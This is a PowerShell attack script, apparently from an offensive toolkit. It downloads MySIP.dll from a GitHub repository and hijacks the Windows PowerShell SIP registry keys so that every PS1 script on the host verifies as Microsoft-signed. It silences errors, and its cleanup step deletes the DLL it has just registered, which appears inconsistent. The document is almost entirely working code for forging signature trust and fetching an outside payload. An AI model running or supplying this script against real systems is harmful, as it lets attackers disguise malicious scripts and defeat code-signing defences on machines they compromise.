<#
.SYNOPSIS
   Author: @netbiosX

.DESCRIPTION
   Digitally sign all powershell scripts on the host as Microsoft..
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$DllPath="$pwd\MySIP.dll"
)

$ErrorActionPreference = "SilentlyContinue"
write-host "`n* Digitally sign all PS1 scripts on the host." -ForegroundColor Green
Start-Sleep -Milliseconds 500


#Administrator privileges required to manipulate HKLM: hive
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
If($IsClientAdmin -iMatch '^(False)$')
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "Administrator privileges required.`n" -ForegroundColor Red
   return
}

#Download DLL
If(-not(Test-Path -Path "$DllPath"))
{
   write-host "+ " -ForegroundColor DarkYellow -NoNewline
   write-host "Downloading MySIP.dll from GitHub .." -ForegroundColor DarkGray
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Sign-Executables/MySIP.dll" -OutFile "$DllPath"|Unblock-File
}


#Digitally sign all powershell scripts on the host as Microsoft
write-host "* Digitally sign all PS1 scripts on the host as Microsoft" -ForegroundColor Green
$GetCertFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' + '\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg' -join ''


#PowerShell SIP Guid
$NewDll = "$DllPath"
$NewFuncName = 'GetLegitMSSignature'
$PSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'
$PEGetMSCert = Get-Item -Path "$GetCertFunc\$PSIPGuid\"

#Sign
$PEGetMSCert | Set-ItemProperty -Name Dll -Value $NewDll
$PEGetMSCert | Set-ItemProperty -Name FuncName -Value $NewFuncName


#Validate the digital signature for all powershell scripts
write-host "* Validate the digital signature for all powershell scripts" -ForegroundColor Green
$ValidateHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' + '\OID\EncodingType 0\CryptSIPDllVerifyIndirectData' -join ''

#PowerShell SIP Guid
$NewDll = "$DllPath"
$NewFuncName = 'AutoApproveHash'
$PSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'
$PSSignatureValidation = Get-Item -Path "$ValidateHashFunc\$PSIPGuid\"

#Validate	
$PSSignatureValidation | Set-ItemProperty -Name Dll -Value $NewDll
$PSSignatureValidation | Set-ItemProperty -Name FuncName -Value $NewFuncName


#Cleanup
If(Test-Path -Path "$DllPath")
{
   Remove-Item -Path "$DllPath" -Force
}
